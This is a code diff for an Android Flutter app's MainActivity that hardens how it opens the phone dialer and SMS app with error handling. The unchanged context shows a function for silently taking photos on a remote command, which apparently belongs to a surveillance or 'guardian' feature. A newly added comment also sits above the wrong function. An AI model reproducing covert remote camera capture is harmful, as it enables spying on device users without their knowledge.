@@ -1,5 +1,6 @@
 package com.mop.mop_app
 
+import android.content.ActivityNotFoundException
 import android.content.ContentUris
 import android.content.Intent
 import android.graphics.Bitmap
@@ -116,21 +117,56 @@ class MainActivity : FlutterActivity() {
                     }
                 }
                 "openSystemDialer" -> {
-                    val number = call.arguments as? String ?: ""
-                    val intent = Intent(Intent.ACTION_DIAL).apply { data = Uri.parse("tel:$number") }
-                    startActivity(intent)
-                    result.success(null)
+                    val number = when (val n = call.arguments) {
+                        is String -> n
+                        is Number -> n.toString()
+                        else -> ""
+                    }
+                    runOnUiThread {
+                        try {
+                            val intent = Intent(Intent.ACTION_DIAL).apply {
+                                data = Uri.parse("tel:$number")
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                            }
+                            startActivity(intent)
+                            result.success(null)
+                        } catch (e: ActivityNotFoundException) {
+                            Log.e("MainActivity", "openSystemDialer: no app", e)
+                            result.error("NO_APP", "无法打开拨号应用", null)
+                        }
+                    }
                 }
                 "openSystemSms" -> {
                     val args = call.arguments as? Map<*, *>
-                    val number = args?.get("number") as? String ?: ""
-                    val content = args?.get("content") as? String ?: ""
-                    val intent = Intent(Intent.ACTION_SENDTO).apply {
-                        data = Uri.parse("smsto:$number")
-                        putExtra("sms_body", content)
+                    val number = when (val n = args?.get("number")) {
+                        is String -> n
+                        is Number -> n.toString()
+                        else -> ""
                     }
-                    startActivity(intent)
-                    result.success(null)
+                    val content = when (val c = args?.get("content")) {
+                        is String -> c
+                        is Number -> c.toString()
+                        else -> ""
+                    }
+                    runOnUiThread {
+                        try {
+                            val intent = Intent(Intent.ACTION_SENDTO).apply {
+                                data = Uri.parse("smsto:$number")
+                                putExtra("sms_body", content)
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                            }
+                            if (intent.resolveActivity(packageManager) != null) {
+                                startActivity(intent)
+                                result.success(null)
+                            } else {
+                                Log.e("MainActivity", "openSystemSms: no app handles smsto")
+                                result.error("NO_APP", "无法打开短信应用", null)
+                            }
+                        } catch (e: ActivityNotFoundException) {
+                            Log.e("MainActivity", "openSystemSms", e)
+                            result.error("NO_APP", "无法打开短信应用", null)
+                        }
+                    }
                 }
                 "startGuardianService" -> {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -523,6 +559,7 @@ class MainActivity : FlutterActivity() {
         }
     }
 
+    /** 规范化号码字符串：去掉数字后多余的 .0，避免 smsto:/tel: 收件人为空或异常 */
     /** 静默拍照（远程采集 mop.cmd.capture.photo），返回 JPEG 字节 */
     private fun capturePhotoSilent(result: MethodChannel.Result) {
         val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
